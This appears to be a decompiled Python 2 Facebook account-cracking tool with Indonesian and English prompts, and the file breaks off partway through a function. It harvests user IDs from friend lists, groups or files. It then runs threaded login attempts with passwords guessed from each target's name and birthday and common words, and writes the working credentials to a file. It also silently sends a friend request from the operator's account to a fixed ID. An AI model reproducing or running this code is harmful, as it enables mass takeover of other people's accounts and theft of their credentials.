# TusBolled by L0V14N4DR
# My Team: Black Coder Crush, TERMUXID3, Skull Of Skill
# Python bytecode 2.7None
# Own Filename: <Sazxt> <-- masih ngaku obfuscator punya lu?
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;91mExit The Program . . .'
    os.sys.exit()

# Percuma lu masukin tapi gak dipake anjing
# Kalo gatau fungsinya mending hapus aja dah
# ↓↓↓↓↓
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')
# ↑↑↑↑↑

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = '\x1b[1;96m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88      \xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\xe2\x96\x88\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\x1b[1;97m_\xe2\x80\x93  \xe2\x80\x94 _  \x1b[1;93m\xe2\x95\xa6  \xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90  \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x90 \x1b[1;96m\n\xe2\x96\x88\x1b[1;97m_-_-- -_ --__ \xe2\x80\x94\x1b[1;93m\xe2\x95\x91  \xe2\x94\x82\xe2\x94\x82 \xe2\x94\xac\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4 \xe2\x94\x82\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\x1b[1;96m\n\xe2\x96\x88\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\x1b[1;97m-- _ \xe2\x80\x94 _ \x1b[1;93m\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x9d\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\x1b[1;97mKINGS\x1b[1;96m\n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88      \xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91 \x1b[1;93m* \x1b[1;97mAuthor  : King Mr_Z17                  \x1b[1;96m\xe2\x95\x91\n\xe2\x95\x91 \x1b[1;93m* \x1b[1;91mYouTube \x1b[1;97m: Mr_Z17                      \x1b[1;96m \xe2\x95\x91\n\xe2\x95\x91 \x1b[1;93m* \x1b[1;97mGithub  : https://github.com/KingMrZ17 \x1b[1;96m\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mTrying Sign In \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def loginSC():
    os.system('sleep 1')
    os.system('clear')
    print ' '
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    jalan('\x1b[1;92m\xe2\x9c\x93 \x1b[1;93mSilhkan cari pass dan user nya di\x1b[1;95m IG \x1b[1;93mAuthor ')
    print '\x1b[1;92m\xe2\x9c\x93 \x1b[1;93mPlease find the user & pass in \x1b[1;95mIG \x1b[1;93mAuthor'
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    jalan('\x1b[1;92m\xe2\x9c\x93 \x1b[1;97mLink\x1b[1;95m IG \x1b[1;97mAuthor ada dibawah ini . .')
    print '\x1b[1;92m\xe2\x9c\x93 \x1b[1;95mIG \x1b[1;97mAuthor link below'
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;97mhttps://bit.ly/2yDihhV'
    print ''
    os.system('sleep 3')
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;97m          LOGIN SCRIPT LIGHT-FB . . .\n'
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    username = raw_input('\x1b[1;96m[*] \x1b[1;97mUSERNAME \x1b[1;91m: \x1b[1;96m')
    password = raw_input('\x1b[1;96m[*] \x1b[1;97mPASSWORS \x1b[1;91m: \x1b[1;96m')
    if username == 'zidan' and password == 'gans':
        print '\x1b[1;96m[\x1b[1;92m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mLogin success'
        time.sleep(1.6)
        os.system('xdg-open https://www.youtube.com/channel/UCnIjuMDviDkcZ_EXC_iNh8g?sub_confirmation=1')
        login()
    else:
        print '\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;91mWrong Input . . ! !'
        time.sleep(1.6)
        loginSC()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;96m[\x1b[1;91m\xe2\x98\x86\x1b[1;96m] \x1b[1;93m  LOGIN WITH YOUR FACEBOOK ACCOUNT   \x1b[1;96m[\x1b[1;91m\xe2\x98\x86\x1b[1;96m]'
        print 44 * '\x1b[1;96m\xe2\x95\x90'
        id = raw_input('\x1b[1;96m[\x1b[1;93m+\x1b[1;96m] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;96m')
        pwd = raw_input('\x1b[1;96m[\x1b[1;93m+\x1b[1;96m] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;96m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;91mConnection Failed . . .'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UCnIjuMDviDkcZ_EXC_iNh8g?sub_confirmation=1')
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mConnection Failed'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mYour Account Cekpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mWrong Input Password/Email/ID'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;91mConnection Failed . . .'
        keluar()

    os.system('clear')
    print logo
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;96m' + nama + '\x1b[1;97m                  '
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m]\x1b[1;97m ID   \x1b[1;91m: \x1b[1;96m' + id + '\x1b[1;97m              '
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;97m1.\x1b[1;96m Crack facebook Super-MBF'
    print '\x1b[1;97m2.\x1b[1;96m Account information'
    print '\x1b[1;97m3.\x1b[1;96m Yahho clone'
    print '\x1b[1;97m4.\x1b[1;96m Subscribe YouTube channel Author'
    print '\n\x1b[1;91m0.\x1b[1;91m Logout'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;96m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9f\xa9 \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;96m[!] \x1b[1;91mWrong Input . . .'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        informasi()
    elif unikers == '3':
        yahoo()
    elif unikers == '4':
        os.system('clear')
        print '\x1b[1;96mBAHASA INDONESIA'
        jalan('\x1b[1;93mBAIK BANGET LU CUK MAU SUBSCRIBE CHANNEL GW . . .')
        jalan('MOGA MOGA REJEKI LU LANCAR CUK . . .')
        print ''
        print '\x1b[1;96mENGLISH'
        jalan("\x1b[1;93mIT'S REALLY NICE OF YOU TO SUBSCRIBE TO MY CHANNEL . . .")
        jalan('GOOD LUCK WITH YOUR FORTUNE . . .')
        os.system('sleep 0.5')
        os.system('xdg-open https://www.youtube.com/channel/UCnIjuMDviDkcZ_EXC_iNh8g?sub_confirmation=1')
        login()
    elif unikers == '0':
        os.system('clear')
        jalan('Remove token')
        os.system('xdg-open https://www.youtube.com/channel/UCnIjuMDviDkcZ_EXC_iNh8g?sub_confirmation=1')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mWrong Input'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;97m1.\x1b[1;96m Crack from friend list'
    print '\x1b[1;97m2.\x1b[1;96m Crack from friends'
    print '\x1b[1;97m2.\x1b[1;96m Crack from group member'
    print '\x1b[1;97m4.\x1b[1;96m Crack from file'
    print '\n\x1b[1;91m0.\x1b[1;91m Return'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9f\xa9 \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mWrong Input'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;96m\xe2\x95\x90'
            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mTake ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;96m\xe2\x95\x90'
            idt = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter Friends ID \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mFriends name\x1b[1;91m     :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;96m[!] \x1b[1;91mFriends not found'
                raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
                super()

            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mTake ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;96m\xe2\x95\x90'
            idg = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter group ID \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mGroup name     \x1b[1;91m:\x1b[1;97m ' + asw['name']
                os.system('sleep 1000')
            except KeyError:
                print '\x1b[1;96m[!] \x1b[1;91mGroup not found'
                raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
                super()

            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mTake ID \x1b[1;97m...')
            re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for p in s['data']:
                id.append(p['id'])

        elif peak == '4':
            os.system('clear')
            print logo
            print 44 * '\x1b[1;96m\xe2\x95\x90'
            try:
                idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;96m[!] \x1b[1;91mFile not found'
                raw_input('\n\x1b[1;96m[ \x1b[1;97mReturn \x1b[1;96m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;96m[!] \x1b[1;91mKONTOL . . . .'
            pilih_super()
        print '\x1b[1;96m[+] \x1b[1;93mTotal ID \x1b[1;91m        : \x1b[1;97m' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;93mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 44 * '\x1b[1;96m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mSUCCESS'
                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mCEKPOINT'
                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
                cek = open('out/super_cp.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mSUCCESS'
                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mCEKPOINT'
                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mSUCCESS'
                        print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Bangsat'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mSUCCESS'
                            print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mCEKPOINT'
                            print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            birthday = b['Kontol']
                            pass5 = birthday.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mSUCCESS'
                                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mCEKPOINT'
                                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Sayang'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mSUCCESS'
                                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;96m[+] \x1b[1;92mCP File tersimpan \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mReturn\x1b[1;96m]')
    super()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 44 * '\x1b[1;96m\xe2\x95\x90'
    aid = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter ID/Name\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mWait a minute\x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print 43 * '\x1b[1;96m='
            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
